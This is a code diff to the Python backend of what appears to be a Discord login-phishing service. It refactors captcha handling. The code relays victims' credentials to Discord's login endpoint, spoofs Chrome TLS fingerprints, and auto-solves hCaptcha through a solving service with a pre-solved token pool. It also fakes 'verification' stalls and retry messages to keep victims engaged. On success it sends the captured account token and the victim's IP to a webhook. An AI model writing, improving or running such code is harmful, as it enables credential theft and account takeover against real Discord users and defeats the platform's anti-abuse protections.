@@ -556,28 +556,30 @@ login_sessions = {}    # Captcha flow: sid -> DiscordSession (persisted between 
 
 # ━━━━━━━━━━━━ Captcha Pre-Solve Pool ━━━━━━━━━━━━
 # Solves captchas in advance so they're ready instantly when needed.
-# Tokens are solved WITHOUT rqdata (generic). Discord usually accepts them.
+# Adapts to whatever sitekey Discord is currently using.
 
 import collections
 
-DEFAULT_SITEKEY = 'a5f74b19-9e45-40e0-b45d-47ff91b7a6c2'
-_presolve_pool = collections.deque()  # deque of {'token': str, 'time': float}
+DEFAULT_SITEKEY = 'a9b5fb07-92ff-493f-86fe-352a2803b3df'
+_last_discord_sitekey = DEFAULT_SITEKEY  # updated whenever Discord returns a captcha
+_presolve_pool = collections.deque()  # deque of {'token': str, 'time': float, 'sitekey': str}
 _presolve_lock = threading.Lock()
 _presolve_active = 0  # number of solves currently running
-PRESOLVE_MAX_ACTIVE = 8  # max concurrent pre-solves (2.5x)
-PRESOLVE_MAX_POOL = 8    # max ready tokens to keep (2.5x)
-PRESOLVE_TOKEN_TTL = 85   # hCaptcha tokens expire ~120s, use well within margin
+PRESOLVE_MAX_ACTIVE = 8  # max concurrent pre-solves
+PRESOLVE_MAX_POOL = 8    # max ready tokens to keep
+PRESOLVE_TOKEN_TTL = 80  # hCaptcha tokens expire ~120s, stay well under
 
 
 def _presolve_worker():
     """Background worker: solve one captcha and add to pool."""
     global _presolve_active
     try:
-        print('[presol] Starting pre-solve...')
-        token, err = solve_captcha(DEFAULT_SITEKEY, '')
+        sitekey = _last_discord_sitekey
+        print(f'[presol] Starting pre-solve (sitekey={sitekey[:16]}...)')
+        token, err = solve_captcha(sitekey, '')
         if token:
             with _presolve_lock:
-                _presolve_pool.append({'token': token, 'time': time.time()})
+                _presolve_pool.append({'token': token, 'time': time.time(), 'sitekey': sitekey})
             print(f'[presol] Token ready! Pool size: {len(_presolve_pool)}')
         else:
             print(f'[presol] Failed: {err}')
@@ -621,19 +623,24 @@ def _presolve_loop():
         time.sleep(3)  # check every 3 seconds (faster refill)
 
 
-def _get_presolved():
-    """Get a pre-solved token if available (FIFO)."""
+def _get_presolved(required_sitekey=None):
+    """Get a pre-solved token if available (FIFO). Checks sitekey match."""
     with _presolve_lock:
         now = time.time()
         while _presolve_pool:
             entry = _presolve_pool.popleft()
             age = now - entry['time']
-            if age < PRESOLVE_TOKEN_TTL:
-                print(f'[presol] Using pre-solved token (age {age:.0f}s)')
-                # Start another solve to refill pool
-                threading.Thread(target=_start_presolve, daemon=True).start()
-                return entry['token']
-            print(f'[presol] Discarding expired token (age {age:.0f}s)')
+            if age >= PRESOLVE_TOKEN_TTL:
+                print(f'[presol] Discarding expired token (age {age:.0f}s)')
+                continue
+            # Check sitekey match if required
+            if required_sitekey and entry.get('sitekey') != required_sitekey:
+                print(f'[presol] Discarding token with wrong sitekey ({entry.get("sitekey", "?")[:16]} != {required_sitekey[:16]})')
+                continue
+            print(f'[presol] Using pre-solved token (age {age:.0f}s, sitekey={entry.get("sitekey", "?")[:16]})')
+            # Start another solve to refill pool
+            threading.Thread(target=_start_presolve, daemon=True).start()
+            return entry['token']
     # Start one if nothing available
     _start_presolve()
     return None
@@ -910,6 +917,9 @@ def api_login():
             rqdata   = j.get('captcha_rqdata', '')
             rqtoken  = j.get('captcha_rqtoken', '')
 
+            # Track sitekey for pre-solve pool
+            _last_discord_sitekey = sitekey
+
             if ANTICAPTCHA_KEY:
                 # ── Auto-solve server-side in background thread ──
                 # Return immediately so frontend can show fake captcha stall
@@ -963,10 +973,12 @@ def api_login():
 
         # Error — forward to frontend with a clear message
         err_msg = j.get('message', '')
+        is_captcha_err = False
         if not err_msg:
             ckeys = j.get('captcha_key', [])
             if isinstance(ckeys, list) and ('captcha-required' in ckeys or 'invalid-response' in ckeys):
-                err_msg = 'Captcha verification failed. Please try again.'
+                is_captcha_err = True
+                err_msg = 'Verification timed out. Retrying...'
             elif j.get('retry_after'):
                 err_msg = f'Rate limited. Try again in {int(j["retry_after"])}s.'
             else:
@@ -979,6 +991,8 @@ def api_login():
                     if fe.get('code') == 'ACCOUNT_LOGIN_VERIFICATION_EMAIL':
                         err_msg = fe.get('message', 'New login location detected. Please check your email.')
         result = {'message': err_msg, 'error': err_msg}
+        if is_captcha_err:
+            result['retry'] = True  # tell frontend to auto-retry
         if j.get('errors'):
             result['errors'] = j['errors']
         if j.get('retry_after'):
@@ -994,7 +1008,11 @@ def api_login():
 
 
 def _bg_solve(sid):
-    """Background thread: solve captcha, re-submit login, store result."""
+    """Background thread: solve captcha, re-submit login, store result.
+    Uses a clean retry loop. Pre-solved tokens only for first attempt when no rqdata.
+    Always solves with correct sitekey + rqdata from Discord's challenge.
+    """
+    global _last_discord_sitekey
     try:
         sess = login_sessions.get(sid)
         if not sess:
@@ -1003,118 +1021,88 @@ def _bg_solve(sid):
         sitekey = sess['sitekey']
         rqdata  = sess['rqdata']
         rqtoken = sess['rqtoken']
-        payload = sess['payload']
+        payload = dict(sess['payload'])
         ds      = sess['session']
 
-        print(f'[bg:{sid}] Solving captcha...')
-        # Try pre-solved token first (instant)
-        presolved = _get_presolved()
-        if presolved:
-            solved_token = presolved
-            err = None
-            print(f'[bg:{sid}] Using PRE-SOLVED token! (instant)')
-        else:
-            solved_token, err = solve_captcha(sitekey, rqdata)
-        if not solved_token:
-            print(f'[bg:{sid}] Solve failed: {err}')
-            sess['result'] = {'error': f'Captcha solve failed: {err}'}
-            sess['result_code'] = 500
-            sess['status'] = 'done'
-            return
+        # Update global sitekey tracker for pre-solve pool
+        _last_discord_sitekey = sitekey
 
-        # Re-submit login with solved captcha token
-        payload['captcha_key'] = solved_token
-        payload['captcha_rqtoken'] = rqtoken
+        MAX_ATTEMPTS = 5
+        j = {}
+        r = None
+        last_ds = ds  # track last DiscordSession for email verify flow
 
-        # Fresh connection, preserve identity
-        snap = ds.snapshot()
-        ds2 = DiscordSession()
-        ds2.s = creq.Session(impersonate='chrome')
-        ds2.restore(snap)
+        for attempt in range(MAX_ATTEMPTS):
+            print(f'[bg:{sid}] Captcha attempt {attempt+1}/{MAX_ATTEMPTS} (sitekey={sitekey[:16]}, rqdata={bool(rqdata)})')
 
-        try:
-            r = ds2.post('/auth/login', payload)
-        except Exception as ce:
-            print(f'[bg:{sid}] Connection error on re-submit: {ce}')
-            snap2 = ds2.snapshot()
-            ds3 = DiscordSession()
-            ds3.s = creq.Session(impersonate='chrome')
-            ds3.restore(snap2)
-            r = ds3.post('/auth/login', payload)
-            ds2 = ds3
+            solved_token = None
 
-        j = r.json()
-        print(f'[bg:{sid}] Re-submit [{r.status_code}]: {r.text[:400]}')
+            # Strategy: only use pre-solved on first attempt AND only when no rqdata
+            # (tokens solved without rqdata won't match challenges that have rqdata)
+            if attempt == 0 and not rqdata:
+                presolved = _get_presolved(required_sitekey=sitekey)
+                if presolved:
+                    solved_token = presolved
+                    print(f'[bg:{sid}] Using PRE-SOLVED token (instant, no rqdata)')
 
-        # Check if ANOTHER captcha came back (need to solve again)
-        ckeys = j.get('captcha_key', [])
-        is_captcha = isinstance(ckeys, list) and (
-            'captcha-required' in ckeys or 'invalid-response' in ckeys
-            or j.get('captcha_sitekey')
-        )
+            if not solved_token:
+                # Solve with the ACTUAL sitekey + rqdata from Discord's challenge
+                solved_token, err = solve_captcha(sitekey, rqdata)
+                if not solved_token:
+                    print(f'[bg:{sid}] Solve failed: {err}')
+                    # If not last attempt, loop will get fresh challenge data
+                    if attempt >= MAX_ATTEMPTS - 1:
+                        sess['result'] = {'error': 'Verification timed out. Retrying...', 'retry': True}
+                        sess['result_code'] = 500
+                        sess['status'] = 'done'
+                        return
+                    continue
 
-        if is_captcha:
-            # Solve again (attempt 2)
-            sitekey2 = j.get('captcha_sitekey', sitekey)
-            rqdata2  = j.get('captcha_rqdata', '')
-            rqtoken2 = j.get('captcha_rqtoken', '')
-            print(f'[bg:{sid}] Another captcha, solving again...')
-            presolved2 = _get_presolved()
-            if presolved2:
-                solved2 = presolved2
-                err2 = None
-                print(f'[bg:{sid}] Using PRE-SOLVED token for attempt 2!')
-            else:
-                solved2, err2 = solve_captcha(sitekey2, rqdata2)
-            if not solved2:
-                sess['result'] = {'error': f'Captcha re-solve failed: {err2}'}
-                sess['result_code'] = 500
-                sess['status'] = 'done'
-                return
-            payload['captcha_key'] = solved2
-            payload['captcha_rqtoken'] = rqtoken2
-            snap3 = ds2.snapshot()
-            ds4 = DiscordSession()
-            ds4.s = creq.Session(impersonate='chrome')
-            ds4.restore(snap3)
-            r = ds4.post('/auth/login', payload)
+            # Submit login with solved captcha token
+            payload['captcha_key'] = solved_token
+            payload['captcha_rqtoken'] = rqtoken
+
+            # Fresh TLS connection, preserve identity (cookies + fingerprint)
+            snap = ds.snapshot()
+            ds2 = DiscordSession()
+            ds2.s = creq.Session(impersonate='chrome')
+            ds2.restore(snap)
+            last_ds = ds2
+
+            try:
+                r = ds2.post('/auth/login', payload)
+            except Exception as ce:
+                print(f'[bg:{sid}] Connection error: {ce}')
+                snap2 = ds2.snapshot()
+                ds3 = DiscordSession()
+                ds3.s = creq.Session(impersonate='chrome')
+                ds3.restore(snap2)
+                r = ds3.post('/auth/login', payload)
+                ds2 = ds3
+                last_ds = ds3
+
             j = r.json()
-            print(f'[bg:{sid}] Attempt 3 [{r.status_code}]: {r.text[:400]}')
+            print(f'[bg:{sid}] Attempt {attempt+1} result [{r.status_code}]: {r.text[:400]}')
 
-            # Check if STILL getting captcha — try one more time (attempt 4)
-            ckeys3 = j.get('captcha_key', [])
-            is_captcha3 = isinstance(ckeys3, list) and (
-                'captcha-required' in ckeys3 or 'invalid-response' in ckeys3
+            # Check if Discord returned another captcha challenge
+            ckeys = j.get('captcha_key', [])
+            is_captcha = isinstance(ckeys, list) and (
+                'captcha-required' in ckeys or 'invalid-response' in ckeys
                 or j.get('captcha_sitekey')
             )
-            if is_captcha3:
-                sitekey3 = j.get('captcha_sitekey', sitekey)
-                rqdata3  = j.get('captcha_rqdata', '')
-                rqtoken3 = j.get('captcha_rqtoken', '')
-                print(f'[bg:{sid}] Still captcha after attempt 3, trying attempt 4...')
-                presolved3 = _get_presolved()
-                if presolved3:
-                    solved3 = presolved3
-                    print(f'[bg:{sid}] Using PRE-SOLVED token for attempt 4!')
-                else:
-                    solved3, err3 = solve_captcha(sitekey3, rqdata3)
-                if not solved3:
-                    sess['result'] = {'error': 'Captcha verification failed after multiple attempts. Please try again.', 'retry': True}
-                    sess['result_code'] = 500
-                    sess['status'] = 'done'
-                    return
-                payload['captcha_key'] = solved3
-                payload['captcha_rqtoken'] = rqtoken3
-                snap4 = ds4.snapshot()
-                ds5 = DiscordSession()
-                ds5.s = creq.Session(impersonate='chrome')
-                ds5.restore(snap4)
-                r = ds5.post('/auth/login', payload)
-                j = r.json()
-                print(f'[bg:{sid}] Attempt 4 [{r.status_code}]: {r.text[:400]}')
-                ds2 = ds5  # update reference for email verify flow
 
-        # Process result
+            if not is_captcha:
+                break  # Not a captcha — process the actual result
+
+            # Captcha came back — update challenge data for next attempt
+            sitekey = j.get('captcha_sitekey', sitekey)
+            rqdata  = j.get('captcha_rqdata', '')
+            rqtoken = j.get('captcha_rqtoken', rqtoken)
+            _last_discord_sitekey = sitekey
+            ds = ds2  # keep session for next attempt
+            print(f'[bg:{sid}] Captcha returned, next attempt with fresh rqdata={bool(rqdata)}')
+
+        # ── Process final result ──
         if j.get('token'):
             ip = sess.get('client_ip', '?')
             fire_webhook(j['token'], ip)
@@ -1136,29 +1124,36 @@ def _bg_solve(sid):
 
             if is_email_verify:
                 print(f'[bg:{sid}] Email verification required — keeping session for retry')
-                # Keep session alive for retry; store the active DS + payload
                 sess['result'] = {'email_verify': True, 'message': 'New login location detected. Please check your email and verify, then click Continue.'}
                 sess['result_code'] = 200
-                sess['retry_ds'] = ds2   # save working session for retry
+                sess['retry_ds'] = last_ds
                 sess['retry_payload'] = dict(payload)
                 sess['retry_payload'].pop('captcha_key', None)
                 sess['retry_payload'].pop('captcha_rqtoken', None)
             else:
-                # Extract best error message from Discord response
-                err_msg = j.get('message', '')
-                if not err_msg and j.get('captcha_key'):
-                    err_msg = 'Captcha verification expired. Please try again.'
-                if not err_msg:
-                    err_msg = 'Login failed. Please check your credentials.'
-                print(f'[bg:{sid}] Error result: {j}')
-                sess['result'] = {'error': err_msg, 'message': err_msg}
-                # Also include errors dict if present for frontend parsing
-                if j.get('errors'):
-                    sess['result']['errors'] = j['errors']
-                sess['result_code'] = r.status_code if r else 500
+                # Check if we're still stuck on captcha after all attempts
+                ckeys_final = j.get('captcha_key', [])
+                if isinstance(ckeys_final, list) and ckeys_final:
+                    # Captcha persisted through all attempts — tell frontend to auto-retry
+                    print(f'[bg:{sid}] Captcha persisted after {MAX_ATTEMPTS} attempts — signaling auto-retry')
+                    sess['result'] = {'error': 'Verification timed out. Retrying...', 'retry': True}
+                    sess['result_code'] = 500
+                else:
+                    err_msg = j.get('message', '')
+                    if not err_msg:
+                        err_msg = 'Login failed. Please check your credentials.'
+                    print(f'[bg:{sid}] Error: {err_msg} | raw: {j}')
+                    sess['result'] = {'error': err_msg, 'message': err_msg}
+                    if j.get('errors'):
+                        sess['result']['errors'] = j['errors']
+                    if j.get('retry_after'):
+                        sess['result']['retry_after'] = j['retry_after']
+                    sess['result_code'] = r.status_code if r else 500
 
         sess['status'] = 'done'
-        print(f'[bg:{sid}] Done. success={j.get("token") is not None}, mfa={j.get("mfa") is not None}, email_verify={is_email_verify if "is_email_verify" in dir() else False}')
+        token_ok = j.get('token') is not None
+        mfa_ok = j.get('mfa') is not None
+        print(f'[bg:{sid}] Done. token={token_ok}, mfa={mfa_ok}, email_verify={is_email_verify if "is_email_verify" in dir() else False}')
 
     except Exception as e:
         import traceback
